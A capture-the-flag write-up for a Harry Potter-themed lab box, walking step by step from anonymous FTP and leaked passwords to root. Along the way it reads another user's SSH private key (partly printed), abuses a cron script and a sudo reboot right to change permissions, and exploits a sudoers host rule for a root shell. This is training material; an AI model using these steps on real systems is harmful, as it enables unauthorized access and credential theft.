# CTF: Yer a Wizard

![Contest Date: 2024-05-14](https://img.shields.io/badge/contest%20date-2024--05--14-informational)
![Category: FTP, Hash, Crontab, SSH Key](https://img.shields.io/badge/category-ftp,hash,crontab,sshkey-%237159c1)
![By: Alexandre & Eloi](https://img.shields.io/badge/by-Alexandre%20%26%20Eloi-%23f9a03c)

## Description

> Find out about the secret wizarding school!

## Write-up

The flag is a reference to the Harry Potter series.

UserFlag: user.txt
RootFlag: root.txt


## Flag Solutions

### User Flag

First thing to do is to check open ports on the target machine. We can do this by running a port scan using `nmap`.

```bash
nmap -sSV $IP
```

Results : 
```bash
PORT   STATE SERVICE VERSION

21/tcp open  ftp     vsftpd 3.0.3

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)

MAC Address: 02:A8:16:1F:4E:E7 (Unknown)

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

The target machine has two open ports, 22 and 21. Port 21 is running an FTP server. Let's connect to the FTP server.

We dont have any credentials to connect to the FTP server. We can try to connect as anonymous.

```bash
ftp $IP
```

We are connected to the FTP server.
```
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```
We do a `ls -la` to see the files in the FTP server.

```bash
ls -al

200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        113          4096 Jan 24  2022 .
drwxr-xr-x    3 0        113          4096 Jan 24  2022 ..
drwxr-xr-x    2 0        0            4096 Jan 24  2022 ...
-rw-r--r--    1 0        0              81 Jan 24  2022 .hidden
226 Directory send OK.
```

We found a file named `.hidden`. We can download this file to our local machine.

```bash
get .hidden
```

We do a `cat` on the file.

```bash
cat .hidden

I swear that my password is Il0veTheMalefoys, trust me, I'm Hagrid, I never lie!
```
We know the user password. We can try to connect to the SSH server using the credentials we found.

```bash
ssh hagrid@$IP
```

We cant connect beacuse the password is false. Beacause is the Harry Potter series Hagrid dont like the Malefoys.

We see a folder named `...`. It is a hidden folder. We can try to access this folder.

```bash
cd ...
```

We do a `ls -la` to see the files in the folder.

```bash
ls -al

200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jan 24  2022 .
drwxr-xr-x    3 0        113          4096 Jan 24  2022 ..
-rw-r--r--    1 0        0              42 Jan 24  2022 .reallyHidden
226 Directory send OK.
```

We found a file named `.reallyHidden`. We can download this file to our local machine.

```bash
get .reallyHidden
```
We do a `cat` on the file.

```bash
cat .reallyHidden

FINE! My password is IAlreadySaidTooMuch
```

We know the user password. We can try to connect to the SSH server using the credentials we found.

```bash
ssh hagrid@$IP
```

We are connected to the SSH server.

We do a `ls` and we found a file `user.txt`.

```bash
cat user.txt
```

We found encoded string. We can decode this string.

We go the [CyberChef](https://icyberchef.com) and we decode the string.

We found the user flag. It was encoded in base64 3 times.

### Root Flag

We do a `ls -la` to see the files in the SSH server.

```bash
ls -la
```

We found a file named `hut.sh`. With permissions to execute. We do a `cat` on the file.

```bash
-rwxrwxr-x 1 hagrid hagrid   34 Jan 23  2022 hut.sh

cat hut.sh

#!/bin/bash

echo "Yer a wizard!"

```

We go to the /home directory and we do a `ls -la` to see the files in the directory.

```bash
cd /home
ls -la

drwxr-xr-x  7 root       root       4096 Jan 24  2022 .
drwxr-xr-x 24 root       root       4096 May 16 08:46 ..
drwx------  3 dumbledore dumbledore 4096 Apr 25  2022 dumbledore
drwxrwxrwx  4 hagrid     hagrid     4096 May 16 08:48 hagrid
drwx--x--x  6 harry      harry      4096 Jan 23  2022 harry
drwx------  2 hermione   hermione   4096 Jan 23  2022 hermione
drwx------  2 ron        ron        4096 Jan 23  2022 ron
```

We do a `cat /etc/crontab` to see the cron jobs.

```bash
@reboot ron bash /home/hagrid/hut.sh
```

We see that the `hut.sh` file is executed at reboot. We can modify the file to execute a chmod 777 on the `/home/ron` directory.

```bash
nano hut.sh

chmod 777 /home/ron
```

But we cant execute the file. We can try `sudo -l` to see if we can execute the file as root.

```bash
sudo -l

User hagrid may run the following commands on hogwarts:
    (root) NOPASSWD: /sbin/reboot
```

We can execute the file as root. We can modify the file to execute a chmod 777 on the `/home/ron` directory.

```bash
sudo -u root /sbin/reboot
```

We are disconnected from the SSH server. We have to wait for the machine to reboot.

After the machine reboots, we can connect to the SSH server again with hagrid credentials.

We do a `cd /home/ron` to go to the `/home/ron` directory.

```bash
cd /home/ron
```

We do a `ls -la` to see the files in the directory.

```bash
ls -la

total 24
drwxrwxrwx 2 ron  ron  4096 Jan 23  2022 .
drwxr-xr-x 7 root root 4096 Jan 24  2022 ..
lrwxrwxrwx 1 root root    9 Jul  3  2020 .bash_history -> /dev/null
-rw-r--r-- 1 ron  ron   220 Jul  2  2020 .bash_logout
-rw-r--r-- 1 ron  ron  3771 Jul  2  2020 .bashrc
-rw-r--r-- 1 ron  ron   807 Jul  2  2020 .profile
-rw-r--r-- 1 root root 1807 Jan 23  2022 dumbledore.txt
````

We found a file named `dumbledore.txt`. We can do a `cat` on the file.

```bash
cat dumbledore.txt

e1f22cea2a1c41f047b36b505a6aede84a848209c69505ac17ffdaebd7ba63c98e69f68f755134d7b94d47d0c86c1aea72f39fa4e8
...
```

We found string encoded in hex. We can decode this string.

We go to the [CyberChef](https://icyberchef.com) and we decode the string.
`

We can try to connect to the SSH server using the credentials we found.

```bash
ssh dumbledore@$IP
```

We are connected to the SSH server.

We do a `ls` and we found a file `note.txt`.

```bash
cat note.txt

Help will always be given at Hogwarts to those who ask for it.

Truth be told, I will always have an eye on you Harry, I can see it all.
```

We need to go the the harry directory. We do a `cd /home/harry` to go to the `/home/harry` directory.

```bash
cd /home/harry
```

We do a `ls -la` to see the files in the directory.

```bash
ls -la

ls: cannot open directory '.': Permission denied
```

We try to show if the .ssh directory is in the harry directory.

```bash
ls -la .ssh
ls: cannot open directory '.ssh': Permission denied
```

We can try to show if `id_rsa` is in the .ssh directory.

```bash
cat .ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEAxmPncAXisNjbU2xizft4aYPqmfXm1735FPlGf4j9ExZhlmmD
NIRchPaFUqJXQZi5ryQH6YxZP5IIJXENK+a4WoRDyPoyGK/63rXTn/IWWKQka9tQ
2xrdnyxdwbtiKP1L4bq/4vU3OUcA+aYHxqhyq39arpeceHVit
```

We found a private key. We can try to connect to the SSH server using the private key.

We save the private key in a file named `id_rsa`.

```bash
ssh harry@$IP -i .ssh/id_rsa
```

We are connected to the SSH server.

We need to search in the `/` directory. We do a `cd /` to go to the `/` directory. And search all references to the word `harry` in all files.

```bash
grep -rni "harry" * 2>/dev/null

etc/passwd-:30:harry:x:1005:1005:Alice,,,:/home/harry:/bin/bash

etc/group-:52:harry:x:1005:

etc/sudoers.d/harry:1:harry strawgoh = (root) NOPASSWD: /bin/bash

etc/group:52:harry:x:1005:

etc/passwd:30:harry:x:1005:1005:Alice,,,:/home/harry:/bin/bash
```

We found a file named `sudoers.d/harry`. Who has permissions to execute `/bin/bash` as root. With hostname `strawgoh`.

```bash
sudo -h strawgoh /bin/bash
```

We are connected as root. We do a `cd /root` to go to the `/root` directory. And we do a `ls -al` to see the files in the directory.

```bash
cd /root
ls 

root.txt

cat root.txt
```

We put the text in ([CyberChef](https://icyberchef.com)) and we decode the string.

We found the root flag. It was encoded multiple times.